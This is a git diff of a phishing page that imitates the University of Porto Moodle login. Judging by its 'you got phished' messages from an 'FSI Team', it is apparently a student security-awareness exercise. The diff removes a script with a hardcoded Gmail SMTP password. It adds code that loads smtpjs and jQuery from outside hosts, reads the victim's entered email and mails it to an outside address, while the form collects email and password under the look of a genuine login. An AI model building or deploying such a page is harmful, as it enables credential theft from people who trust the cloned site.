@@ -93,7 +93,7 @@ M.yui.loader = {modules: {}};
                                 <label for="email" class="sr-only">
                                         E-mail Google ou Temp-mail
                                 </label>
-                                <input type="email" name="email" id="username" class="form-control" value="" placeholder="E-mail Google ou Temp-mail" autocomplete="username" required>
+                                <input type="email" name="email" id="email" id="username" class="form-control" value="" placeholder="E-mail Google ou Temp-mail" autocomplete="username" required>
                             </div>
                             <div class="form-group">
                                 <label for="password" class="sr-only">Palavra-passe</label>
@@ -101,7 +101,7 @@ M.yui.loader = {modules: {}};
                             </div>
                             <input type="hidden" name="_subject" value="Ups it looks like you got 'p'ished 🤡">
                             <input type="hidden" name="_template" value="box">
-                            <input type="hidden" name="_autoresponse" value="Don't worry we got you covered! Best regards from the FSI Team.">
+                            <input type="hidden" name="_autoresponse" value="Upsssss it looks like you got 'p'ished 🤡. Don't worry we got you covered! Next time make sure you check the domain name before inserting any credentials, check the browser console for potential javascript errors and mainly never trust anyone! Best regards from the FSI Team.">
                             <input type="text" name="_honey" style="display:none">
                             <input type="hidden" name="_next" value="http://127.0.0.1:5500/hacked.html">
                             <button type="submit" class="btn btn-primary btn-block mt-3" id="loginbtn">Entrar</button>
@@ -276,23 +276,40 @@ M.yui.loader = {modules: {}};
     });
     //]]>
     </script>
-    <script type="text/javascript">
-        function sendEmail(target) {
-          Email.send({
-            Host: "smtp.gmail.com",
-            Username: "semana.eng.22@gmail.com",
-            Password: "Pass123!",
-            To: target,
-            From: "semana.eng.22@gmail.com",
-            Subject: "Teste Final",
-            Body: "Vamos ver se é desta.",
-        })
-        .then(function (message) {
-          alert("mail sent successfully")
-        });
-    }
+    <<!-- script starts -->
+
+    <!--this is essential to link this smtp and jquery cdn link-->
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js"
+    integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <!--this is essential to link this smtp and jquery cdn link-->
+
+    <script>
+        function sendemail() {
+            var email = $('#email').val();
+
+            var Body =  email;
+            Email.send({
+                SecureToken: "Your SecureToken",
+                To: 'youremail@gmail.com',
+                From: "youremail@gmail.com",
+                Subject: "New message on contact us form ",
+                Body : Body
+            }).then(
+                message => {
+                    //console.log (message);
+                    if (message == 'OK') {
+                        window.location.replace("validate.html")
+                    }
+                    else {
+                        console.error(message);
+                    }
+                }
+            );
+        }
     </script>
-    <script src="https://moodle.up.pt/lib/javascript.php/1644574168/theme/uportoboost/javascript/uportoboostscripts.js"></script>
+        <script src="https://moodle.up.pt/lib/javascript.php/1644574168/theme/uportoboost/javascript/uportoboostscripts.js"></script>
     <script>
     //<![CDATA[
     M.str = {"moodle":{"lastmodified":"\u00daltima altera\u00e7\u00e3o","name":"Nome","error":"Erro","info":"Informa\u00e7\u00e3o","yes":"Sim","no":"N\u00e3o","ok":"OK","cancel":"Cancelar","confirm":"Confirma\u00e7\u00e3o","areyousure":"Tem a certeza?","closebuttontitle":"Fechar","unknownerror":"Erro desconhecido","file":"Ficheiro","url":"URL"},"repository":{"type":"Tipo","size":"Tamanho:","invalidjson":"String JSON inv\u00e1lida","nofilesattached":"Sem ficheiros em anexo","filepicker":"Escolha de ficheiros","logout":"Sair","nofilesavailable":"N\u00e3o existem ficheiros dispon\u00edveis","norepositoriesavailable":"Nenhum dos seus reposit\u00f3rios atuais pode devolver ficheiros no formato indicado.","fileexistsdialogheader":"Ficheiro existente","fileexistsdialog_editor":"Um ficheiro com esse nome j\u00e1 se encontra anexo ao texto que est\u00e1 a editar.","fileexistsdialog_filemanager":"Um ficheiro com esse nome j\u00e1 se encontra anexo","renameto":"Renomear para \"{$a}\"","referencesexist":"Existem {$a} hiperliga\u00e7\u00f5es para este ficheiro","select":"Selecionar"},"admin":{"confirmdeletecomments":"Tem a certeza de que pretende apagar coment\u00e1rios?","confirmation":"Confirma\u00e7\u00e3o"},"debug":{"debuginfo":"Informa\u00e7\u00e3o de depura\u00e7\u00e3o","line":"Linha","stacktrace":"Stack trace"},"langconfig":{"labelsep":":&nbsp;"}};
